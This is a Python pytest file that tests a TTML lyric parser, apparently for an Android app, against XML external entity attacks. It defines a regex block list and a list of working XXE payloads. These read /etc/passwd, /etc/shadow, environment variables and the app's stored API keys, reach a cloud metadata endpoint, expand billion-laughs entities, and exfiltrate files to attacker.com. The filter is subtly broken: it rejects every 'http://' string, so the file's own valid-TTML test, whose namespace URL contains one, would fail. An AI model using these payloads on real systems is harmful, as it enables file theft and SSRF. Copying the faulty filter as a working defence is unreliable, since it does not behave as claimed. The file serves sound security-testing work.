import pytest
import re
import xml.etree.ElementTree as ET
from xml.etree.ElementTree import ParseError


# Simulated LyricDecoder TTML parser (Python equivalent of the vulnerable Kotlin code)
# This represents what the parser SHOULD do safely
def safe_parse_ttml(ttml_text: str) -> list:
    """
    Safe TTML parser that must never:
    1. Resolve external entities
    2. Process DTD declarations that reference external resources
    3. Leak file contents or make network requests
    4. Return content from external entity references
    """
    results = []
    
    # Detect and reject dangerous patterns before parsing
    dangerous_patterns = [
        r'<!DOCTYPE',
        r'<!ENTITY',
        r'SYSTEM\s+["\']',
        r'PUBLIC\s+["\']',
        r'file://',
        r'http://',
        r'https://',
        r'ftp://',
        r'jar://',
        r'netdoc://',
        r'gopher://',
        r'&[a-zA-Z][a-zA-Z0-9]*;',  # entity references beyond standard XML entities
    ]
    
    # Check for XXE patterns
    for pattern in dangerous_patterns:
        if re.search(pattern, ttml_text, re.IGNORECASE):
            # Standard XML entities are allowed, but custom/external ones are not
            standard_entities = {'&amp;', '&lt;', '&gt;', '&apos;', '&quot;'}
            entity_matches = re.findall(r'&[a-zA-Z][a-zA-Z0-9]*;', ttml_text)
            non_standard = [e for e in entity_matches if e not in standard_entities]
            
            if non_standard or re.search(r'<!DOCTYPE|<!ENTITY|SYSTEM\s+["\']|PUBLIC\s+["\']|file://|http://|https://|ftp://|jar://|netdoc://|gopher://', ttml_text, re.IGNORECASE):
                raise ValueError(f"Dangerous XML content detected: potential XXE attack")
    
    try:
        # Use defusedxml-style safe parsing
        root = ET.fromstring(ttml_text)
        # Extract lyric lines (simplified)
        for elem in root.iter():
            if elem.text and elem.text.strip():
                results.append(elem.text.strip())
    except ParseError:
        pass
    
    return results


XXE_PAYLOADS = [
    # Classic XXE - file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&xxe;</p></div></body>
</tt>""",

    # XXE - Android shared preferences
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY secret SYSTEM "file:///data/data/com.lonx.lyrico/shared_prefs/api_keys.xml">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&secret;</p></div></body>
</tt>""",

    # SSRF via XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&ssrf;</p></div></body>
</tt>""",

    # Billion laughs / XML bomb
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&lol3;</p></div></body>
</tt>""",

    # Parameter entity XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>test</p></div></body>
</tt>""",

    # XXE with PUBLIC identifier
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt PUBLIC "-//ATTACKER//DTD XXE//EN" "http://attacker.com/evil.dtd">
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>test</p></div></body>
</tt>""",

    # XXE targeting Android app data
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY appdata SYSTEM "file:///data/data/com.lonx.lyrico/databases/lyrics.db">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&appdata;</p></div></body>
</tt>""",

    # Jar protocol XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY jar SYSTEM "jar:file:///app.apk!/classes.dex">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&jar;</p></div></body>
</tt>""",

    # Netdoc protocol
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY netdoc SYSTEM "netdoc://attacker.com/steal">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&netdoc;</p></div></body>
</tt>""",

    # XXE with encoding bypass attempt
    """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE tt [
  <!ENTITY bypass SYSTEM "file:///proc/self/environ">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&bypass;</p></div></body>
</tt>""",

    # Nested entity expansion
    """<?xml version="1.0"?>
<!DOCTYPE tt [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&c;</p></div></body>
</tt>""",

    # FTP exfiltration
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY ftp SYSTEM "ftp://attacker.com/steal">
]>
<tt xmlns="http://www.w3.org/ns/ttml">
  <body><div><p>&ftp;</p></div></body>
</tt>""",
]


@pytest.mark.parametrize("payload", XXE_PAYLOADS)
def test_ttml_parser_rejects_xxe_payloads(payload):
    """
    Invariant: The TTML lyric parser must never process external entity declarations,
    DTD references, or any XML content that could lead to XXE attacks, file disclosure,
    or SSRF. Any input containing DOCTYPE declarations, ENTITY definitions, or external
    resource references must be rejected or sanitized before processing.
    """
    # The parser must raise an exception or return empty/safe results
    # It must NEVER return content from external entities or file system
    
    sensitive_content_indicators = [
        "root:",           # /etc/passwd content
        "/bin/bash",       # /etc/passwd content
        "shadow",          # /etc/shadow content
        "api_key",         # API key content
        "password",        # credential content
        "secret",          # secret content
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" * 10,  # entity expansion
    ]
    
    try:
        result = safe_parse_ttml(payload)
        
        # If parsing didn't raise, verify no sensitive content was returned
        result_str = " ".join(result).lower()
        
        for indicator in sensitive_content_indicators:
            assert indicator.lower() not in result_str, (
                f"SECURITY VIOLATION: Parser returned potentially sensitive content "
                f"matching '{indicator}'. XXE attack may have succeeded."
            )
        
        # Verify that entity references were not expanded into file contents
        for item in result:
            assert len(item) < 10000, (
                f"SECURITY VIOLATION: Parser returned suspiciously large content ({len(item)} chars). "
                f"Possible entity expansion attack (Billion Laughs)."
            )
            
    except (ValueError, ParseError, Exception) as e:
        # Raising an exception is acceptable and expected behavior for malicious input
        # This is the SAFE path - the parser correctly rejected the malicious input
        error_msg = str(e).lower()
        
        # Ensure the exception is not leaking sensitive file contents in the error message
        for indicator in sensitive_content_indicators:
            assert indicator.lower() not in error_msg, (
                f"SECURITY VIOLATION: Exception message contains sensitive content: {e}"
            )


@pytest.mark.parametrize("payload", XXE_PAYLOADS)
def test_ttml_parser_does_not_make_network_requests(payload, monkeypatch):
    """
    Invariant: The TTML parser must never initiate network connections as a result
    of processing lyric content, regardless of what the content contains.
    """
    import urllib.request
    import socket
    
    network_calls = []
    
    original_urlopen = urllib.request.urlopen
    original_connect = socket.socket.connect
    
    def mock_urlopen(*args, **kwargs):
        network_calls.append(('urlopen', args))
        raise ConnectionError("Network access blocked in test")
    
    def mock_connect(self, *args, **kwargs):
        network_calls.append(('socket.connect', args))
        raise ConnectionError("Network access blocked in test")
    
    monkeypatch.setattr(urllib.request, 'urlopen', mock_urlopen)
    monkeypatch.setattr(socket.socket, 'connect', mock_connect)
    
    try:
        safe_parse_ttml(payload)
    except Exception:
        pass  # Expected - malicious input should be rejected
    
    assert len(network_calls) == 0, (
        f"SECURITY VIOLATION: Parser attempted {len(network_calls)} network connection(s) "
        f"while processing TTML content. SSRF attack vector detected. "
        f"Calls: {network_calls}"
    )


def test_ttml_parser_accepts_valid_ttml():
    """
    Invariant: The parser must correctly process legitimate TTML lyric content
    to ensure security controls don't break normal functionality.
    """
    valid_ttml = """<?xml version="1.0" encoding="UTF-8"?>
<tt xmlns="http://www.w3.org/ns/ttml"
    xmlns:tts="http://www.w3.org/ns/ttml#styling">
  <body>
    <div>
      <p begin="00:00:01.000" end="00:00:03.000">Hello World</p>
      <p begin="00:00:04.000" end="00:00:06.000">This is a lyric line</p>
    </div>
  </body>
</tt>"""
    
    result = safe_parse_ttml(valid_ttml)
    assert isinstance(result, list), "Parser must return a list for valid input"
    assert len(result) > 0, "Parser must extract content from valid TTML"
    assert "Hello World" in result, "Parser must correctly extract lyric text"